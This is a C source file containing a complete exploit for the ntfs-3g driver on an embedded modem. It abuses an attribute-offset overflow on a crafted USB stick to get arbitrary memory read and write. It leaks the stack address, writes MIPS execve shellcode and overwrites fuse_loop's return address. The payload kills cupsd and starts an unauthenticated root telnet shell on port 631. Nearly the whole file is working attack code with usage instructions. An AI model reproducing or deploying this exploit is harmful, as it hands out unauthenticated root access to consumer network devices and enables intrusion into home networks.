#include <stdio.h>
#include <stdlib.h>

#define _GNU_SOURCE
#define __USE_GNU 1

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

// Switch byte order if different endianess than the modem's cpu
#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
#  define BE32(r) (r)
#else
#  define BE32(r) (__builtin_bswap32(r))
#endif

// Files with different attribute offsets
// We need to use an attribute offset so that:
//   heap_allocated_addr + attrib_offset % 0x1000 == 0
char *paths[] = {
    "smb/file",
};

// Offset to overflow the pointer back to address 0x00
#define OFFSET_OVERFLOW 0xffbbd000

// Part of /bin/ntfs-3g which can be used to check if the attribute offset is correct
// Which attribute offset will be correct depends on which address we'll get during heap allocation
// If it's correct we can switch to another file with a different attribute offset
#define ADDR_IDENT 0x409000

// Offset to a mount_dst string pointer
// It's stored in ntfs-3g data section (which address is static) and points to the
// stack, so it can be used to obtain the stack address
#define ADDR_MOUNT_DST_PTR 0x41c610

// Address of the fuse_loop return address that should be on the stack
#define FUSE_LOOP_RET_ADDR "\x00\x40\xa3\x64"

int exploit_read(int fd, void* buf, size_t size, uint64_t addr)
{
    // just a fancy pread that takes care of the offsets and prints debug info
    // addr is the absolute memory address
    // In case of an error it exits, ntfs-3g is now probably dead anyway
    uint32_t offset = (uint32_t)((OFFSET_OVERFLOW + addr) & 0xffffffff);

    int ret = pread(fd, buf, size, offset);
    if (ret == -1)
    {
        printf("%llx: ERROR READING FROM ADDR_REL = %llx\n", addr, offset);
        printf("NTFS-3G probably now segfaulted\n");
        printf("Reinsert the usb stick to restart it\n");
        exit(1);
    }

    printf("%lx -> ", addr);
    if (ret > 8) printf("\n");
    bool skipping = false;
    for (int i = 0; i < ret; i++)
    {
        if ((i) % 16 == 0)
        {
            // Start of the line
            //
            // Skip if empty
            if ((ret - i > 16)
                    && (memcmp(buf+i, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) == 0))
            {
                if (skipping)
                {
                    continue;
                } else
                {
                    skipping = true;
                    printf("*\n");
                    continue;
                }
            } else
            {
                skipping = false;
            }

            // Address prefix
            printf("\033[32m%08x (+%04x):\033[0m ", addr + i, i);
        }

        if (skipping) continue;

        // Actual data
        printf("%02x", ((unsigned char*)buf)[i]);

        // Spaces between words
        if ((i+1) % 4 == 0) printf(" ");

        // Ascii representation at the end of the hex line
        if ((i+1) % 16 == 0)
        {
            printf("    \033[90m|\033[0m    ");

            for (int j = 0; j < 16; j++)
            {
                char cur_char = ((char*)buf)[i-15 + j];

                if ((cur_char >= 0x20) && (cur_char <= 0x7e))
                    // Printable
                    printf("%c", cur_char);
                else
                    // Non printable
                    printf("\033[90m.\033[0m");
            }

            printf("\n");
        }
    }

    printf("\n");

    return ret;
}

int exploit_write(int fd, void* buf, size_t size, uint64_t addr)
{
    // just a fancy pwrite that takes care of the offsets and prints debug info
    // offset is the absolute memory address
    // In case of an error it exits, ntfs-3g is now probably dead anyway
    uint32_t offset = (uint32_t)((OFFSET_OVERFLOW + addr) & 0xffffffff);

    printf("Writing 0x%lxB to %08llx\n", size, addr);

    int ret = pwrite(fd, buf, size, offset);
    if (ret == -1)
    {
        printf("%llx: ERROR WRITING ADDR_REL = %llx\n", addr, offset);
        printf("NTFS-3G probably now segfaulted\n");
        printf("Reinsert the usb stick to restart it\n");
        exit(1);
    }

    return ret;
}

bool exploit_verify_alignment(int fd)
{
    // Verifies the alignment
    // Returns 1 if alignment is good
    // Returns 0 if unexpected data was found (wrong alignment)
    unsigned char ident[64];
    int ret = exploit_read(fd, ident, sizeof(ident), ADDR_IDENT);

    // What normally should be at ADDR_IDENT
    const unsigned char ident_good[] = {
        0x24, 0x84, 0xbb, 0x88, 0xaf, 0xa4, 0x00, 0x14,
        0xaf, 0xa3, 0x00, 0x18, 0xaf, 0xa2, 0x00, 0x1c,
        0x3c, 0x02, 0x00, 0x41, 0x24, 0x44, 0xc1, 0x70,
        0x3c, 0x02, 0x00, 0x41, 0x24, 0x45, 0xb5, 0xb0,
        0x24, 0x06, 0x08, 0x14, 0x24, 0x07, 0x00, 0x80,
        0x8f, 0x82, 0x80, 0x48, 0x00, 0x40, 0xc8, 0x21,
        0x03, 0x20, 0xf8, 0x09, 0x00, 0x00, 0x00, 0x00,
        0x8f, 0xdc, 0x00, 0x20, 0x24, 0x02, 0xff, 0xff,
    };
    bool correct = memcmp(ident, ident_good, sizeof(ident)) == 0;
    if (correct)
        printf("\033[32mCorrect alignment:\033[0m ");
    else
        printf("\033[31mIncorrect alignment:\033[0m ");

    for(int i = 0; i < sizeof(ident); i++)
        printf("%02x", ident[i]);

    printf("\n\n");

    return correct;
}

int exploit_open_mem()
{
    printf("Finding a file with correctly aligned data offset\n");

    for (int i = 0; i < sizeof(paths) / sizeof(*paths); i++)
    {
        printf("Trying %s\n", paths[i]);
        int fd = open(paths[i], O_RDWR | O_DIRECT);
        if (fd == -1)
        {
            printf("Error opening %s\n", paths[i]);
            exit(1);
        }

        bool correct = exploit_verify_alignment(fd);

        if (correct)
        {
            return fd;
        } else
        {
            close(fd);
        }
    }

    printf("Couldn't find a correct attribute alignment!\n");
    printf("If you've already set the offset using ntfs_edit_offset.py "
           "and the --ident parameter then unplugging and plugging back "
           "in the usb stick might resolve the issue.\n");
    printf("If you haven't, then use ntfs_edit_offset.py with the "
           "--ntfs-3g and --ident parameters. Ident should be set to "
           "the hex string above.\n");
    exit(1);
}

int main()
{
    int fd = exploit_open_mem();

    uint32_t mnt_dst_ptr;
    printf("mnt_dst_ptr: ");
    exploit_read(fd, &mnt_dst_ptr, sizeof(mnt_dst_ptr), ADDR_MOUNT_DST_PTR);
    mnt_dst_ptr = BE32(mnt_dst_ptr);
    if (mnt_dst_ptr == 0)
    {
        printf("mnt_dst_ptr is 0! Something went wrong!\n");
        exit(1);
    }

    uint32_t stack_top;
    stack_top = (mnt_dst_ptr | 0xfff) + 1;
    printf("stack_top: %llx\n", stack_top);

    // This space should be empty
    // Also, it's both executable and writable, yay!
    uint32_t exploit_addr       = stack_top - 0xa000;
    uint32_t pathname_addr      = exploit_addr;
    uint32_t argv_ptr_list_addr = exploit_addr + 1024;
    uint32_t argv_strings_addr  = exploit_addr + 1024 * 2;
    uint32_t code_addr          = exploit_addr + 1024 * 3;
    uint32_t env_ptr_list_addr  = exploit_addr + 1024 * 4;

    char busybox_path[] = "/bin/busybox";
    // NOTE: offsets to individual parts are hard coded in the argv_ptr_list below
    char argv_strings[] =
        "sh" "\0"
        "-c" "\0"
        "killall -SIGKILL cupsd ; telnetd -l /bin/sh -p 631 -b 192.168.1.1 -F" "\0";
    uint32_t argv_ptr_list[] = {
        BE32(argv_strings_addr),
        BE32(argv_strings_addr+3),
        BE32(argv_strings_addr+6),
        0x00
    };

    printf("\n");
    printf("Writing execve's pathname\n");
    exploit_write(fd, busybox_path, sizeof(busybox_path), pathname_addr);

    printf("Writing execve's argv strings\n");
    exploit_write(fd, argv_strings, sizeof(argv_strings), argv_strings_addr);

    printf("Writing execve's argv char* array\n");
    exploit_write(fd, argv_ptr_list, sizeof(argv_ptr_list), argv_ptr_list_addr);

    // li $v0, 4011;       # SYS_EXECVE
    // li $a0, 0x00000000; # char *const pathname
    // li $a1, 0x00000000; # char *argv[]
    // li $a2, 0x00000000; # char *const envp[]
    // syscall
    unsigned char code[] = {
        0x24, 0x02, 0x0f, 0xab,
        0x3c, 0x04, 0x00, 0x00, 0x34, 0x84, 0x00, 0x00,
        0x3c, 0x05, 0x00, 0x00, 0x34, 0xa5, 0x00, 0x00,
        0x3c, 0x06, 0x00, 0x00, 0x34, 0xc6, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x0c,
    };

    // Patch addresses
    code[6] = (pathname_addr >> 24) & 0xff;
    code[7] = (pathname_addr >> 16) & 0xff;
    code[10] = (pathname_addr >> 8) & 0xff;
    code[11] = (pathname_addr) & 0xff;

    code[14] = (argv_ptr_list_addr >> 24) & 0xff;
    code[15] = (argv_ptr_list_addr >> 16) & 0xff;
    code[18] = (argv_ptr_list_addr >> 8) & 0xff;
    code[19] = (argv_ptr_list_addr) & 0xff;

    code[22] = (env_ptr_list_addr >> 24) & 0xff;
    code[23] = (env_ptr_list_addr >> 16) & 0xff;
    code[26] = (env_ptr_list_addr >> 8) & 0xff;
    code[27] = (env_ptr_list_addr) & 0xff;

    printf("Writing exploit code to stack\n");
    exploit_write(fd, code, sizeof(code), code_addr);

    // Read stack to get find the address of return ptr from fuse_loop
    uint32_t stack_to_read = 0x8000;
    unsigned char* stack = malloc(stack_to_read);

    printf("\n");
    printf("Reading stack:\n");
    exploit_read(fd, stack, stack_to_read, stack_top - stack_to_read);

    uint32_t code_addr_be = BE32(code_addr);
    void* ret_ptr_abs = memmem(stack, stack_to_read, FUSE_LOOP_RET_ADDR, 4);

    if (ret_ptr_abs == 0)
    {
        // Can't find return address from fuse_loop
        if (memmem(stack, stack_to_read, &code_addr_be, 4) == 0)
        {
            // It's not overwritten either, that's weird
            printf("Can't find the return pointer!\n");
            exit(1);
        } else
        {
            printf("Return pointer from fuse_loop already overwritten!\n");
        }
    } else
    {
        // Overwrite return address from fuse_loop
        uint32_t ret_ptr = (stack_top - stack_to_read) + (ret_ptr_abs - (void*)stack);

        printf("Overwriting return pointer from fuse_loop\n");
        exploit_write(fd, &code_addr_be, 4, ret_ptr);
    }

    free(stack);
    close(fd);

    printf("\n");
    printf("That's all!\n");
    printf("To activate the telnet server you now have to unmount the usb stick "
           "from the modem's admin page or by physically disconnecting it\n");
    printf("Have fun!\n");
}
